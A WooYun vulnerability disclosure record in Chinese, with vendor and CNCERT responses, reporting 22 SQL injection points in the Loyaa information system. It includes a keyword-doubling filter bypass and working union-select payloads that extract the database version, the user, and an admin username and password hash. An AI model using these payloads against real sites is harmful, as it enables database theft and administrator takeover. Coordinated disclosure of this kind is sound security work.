{"id": 84863, "wybug_id": "wooyun-2015-0139977", "wybug_title": "Loyaa 信息自动采编系统22处SQL注入绕过漏洞打包（可获取部分数据）", "wybug_corp": "宜达科技", "wybug_author": "goubuli", "wybug_date": "2015-09-16 13:57", "wybug_open_date": "2015-12-17 15:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： RT手头一堆打包提交 详细说明：  手头关于这套系统的所有洞打包提交这套系统以前挖过，见这里【http://**.**.**.**/bugs/wooyun-2010-095995】，手头关于这套系统的洞一直没有提交，今天整理下所有打包提交wooyun\n厂商：宜达科技http://**.**.**.**/\n22处漏洞整理【1】-----------------------------------------------漏洞文件：search.php漏洞参数：所有参数参考地址：http://**.**.**.**/news/search.phpPOST：k=2020和http://**.**.**.**/search.php?u=76&k=2020'【2】-----------------------------------------------漏洞文件：index4.php漏洞参数：所有参数参考地址：http://**.**.**.**/topic/index4.php?c=109736&t=31a【3】-----------------------------------------------漏洞文件：more_a1.php漏洞参数：c参考地址：http://**.**.**.**/more_a1.php?p=0&c=101007【4】-----------------------------------------------漏洞文件：detail_a1.php漏洞参数：所有参数参考地址：http://**.**.**.**/detail_a1.php?c=101007&i=268620a【5】-----------------------------------------------漏洞文件：newsmore.php漏洞参数：c、u参考地址：http://**.**.**.**/newsmore.php?p=0&c=101002&u=76a【6】-----------------------------------------------漏洞文件：newsdetail.php漏洞参数：所有参数参考地址：http://**.**.**.**/newsdetail.php?c=101002&i=269162a【7】-----------------------------------------------漏洞文件：ldxx.php漏洞参数：c、u参考地址：http://**.**.**.**/ldxx.php?p=0&c=301101&u=76a【8】-----------------------------------------------漏洞文件：zwmore.php漏洞参数：c、u参考地址：http://**.**.**.**/zwmore.php?p=0&c=300342&u=73a【9】-----------------------------------------------漏洞文件：news1more.php漏洞参数：c、u参考地址：http://**.**.**.**/news1more.php?p=0&c=212001a&u=73【10】-----------------------------------------------漏洞文件：news2more.php漏洞参数：c、u参考地址：http://**.**.**.**/news2more.php?p=0&c=212080a&u=73【11】-----------------------------------------------漏洞文件：bs1more.php漏洞参数：c、u参考地址：http://**.**.**.**/bs1more.php?p=0&c=212011&u=73a【12】-----------------------------------------------漏洞文件：bs2more.php漏洞参数：c、u参考地址：http://**.**.**.**/bs2more.php?p=0&c=212021&u=73a【13】-----------------------------------------------漏洞文件：bs3more.php漏洞参数：c、u参考地址：http://**.**.**.**/bs3more.php?p=0&c=212034&u=73a【14】-----------------------------------------------漏洞文件：bs4more.php漏洞参数：c、u参考地址：http://**.**.**.**/bs4more.php?p=0&c=212045&u=73a【15】-----------------------------------------------漏洞文件：kpmore.php漏洞参数：c、u参考地址：http://**.**.**.**/kpmore.php?p=0&c=212055&u=73a【16】-----------------------------------------------漏洞文件：jlmore.php漏洞参数：c、u参考地址：http://**.**.**.**/jlmore.php?p=0&c=101007&u=73a【17】-----------------------------------------------漏洞文件：aqmore.php漏洞参数：c、u参考地址：http://**.**.**.**/aqmore.php?p=0&c=212061&u=73a【18】-----------------------------------------------漏洞文件：jjmore.php漏洞参数：c、u参考地址：http://**.**.**.**/jjmore.php?p=0&c=201210&u=58a【19】-----------------------------------------------漏洞文件：dwmore.php漏洞参数：c、u参考地址：http://**.**.**.**/dwmore.php?p=0&c=101201&u=58a【20】-----------------------------------------------漏洞文件：dwdetail.php漏洞参数：所有参数参考地址：http://**.**.**.**/dwdetail.php?c=101201&i=267951a【21】-----------------------------------------------漏洞文件：zsdetail.php漏洞参数：所有参数参考地址：http://**.**.**.**/zsdetail.php?c=301312&i=268300a【22】-----------------------------------------------漏洞文件：zwdetail.php漏洞参数：所有参数参考地址：http://**.**.**.**/zwdetail.php?c=300126&i=258484a搜索特征和案例在上一个洞里已经说明：传送->http://**.**.**.**/bugs/wooyun-2010-095995涉及站点部分案例：http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/\thttp://**.**.**.**/http://**.**.**.**/http://**.**.**.**/漏洞证明（展示一部分）：1、http://**.**.**.**/search.php?u=76&k=2020'\n\n2、http://**.**.**.**/topic/index4.php?c=109736&t=31a\n\n3、http://**.**.**.**/more_a1.php?p=0&c=101007a\n\n4、http://**.**.**.**/detail_a1.php?c=101007&i=268620a\n\n5、http://**.**.**.**/newsmore.php?p=0&c=101002&u=76a\n\n6、http://**.**.**.**/newsdetail.php?c=101002&i=269162a\n\n其他类似不一一截图展示了下面在漏洞证明中，看注入绕过   漏洞证明：  演示：拿其中一个注入演示每个站点利用方式类似具体链接：http://**.**.**.**/dwdetail.php?c=101201&i=267951a1、提交and 1=1直接过滤了and和=如图\n\n2、同样过滤了(、)、<、>等3、没有过滤order by，给后面union提供了便利\n\nhttp://**.**.**.**/dwdetail.php?i=267951&c=101201 order by 94、绕过注入在前一个漏洞中已经说明，该套系统对SQL的处理仅仅是关键字replace故而可以采用anandd、selselectect、ununionion、frfromom等替换and、select、union、from等关键字如图\n\n\n\n字段2、5、6、7、8可用union在查询的过程中需要让前面的select不出数据才能展示后面的数据，之前我的做法是 anandd 1 is false ununionion selselectect 1,2,3,4,5,6,7,8,9其实不需要那么麻烦，直接把c置为-1或者数据库中一个不存在的记录即可5、常规注入数据库版本：http://**.**.**.**/dwdetail.php?i=267951&c=-1 ununionion selselectect 1,@@version,3,4,5,6,7,8,9\n\n查数据库连接用户http://**.**.**.**/dwdetail.php?i=267951&c=-1 ununionion selselectect 1,current_user,3,4,5,6,7,8,9\n\n我们在前面的报错处可以看到爆错的SQL，直接查信息user_info \nhttp://**.**.**.**/dwdetail.php?i=267951&c=-1 ununionion selselectect 1,username,3,4,5,6,userpassword,8,9 frfromom user_info\n\n\n得到用户名：admin密码：*7D4170B3DFD2B12261BC4D66C055EF5962E1C373密文类型:mysql5。\n\n可以直接解密进后台声明：未作任何破坏，未用扫描器，仅测试。   修复方案：  过滤+补丁   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-09-18 14:58 厂商回复： CNVD确认并复现所述情况，根据实测案例,已经转由CNCERT下发给江苏分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}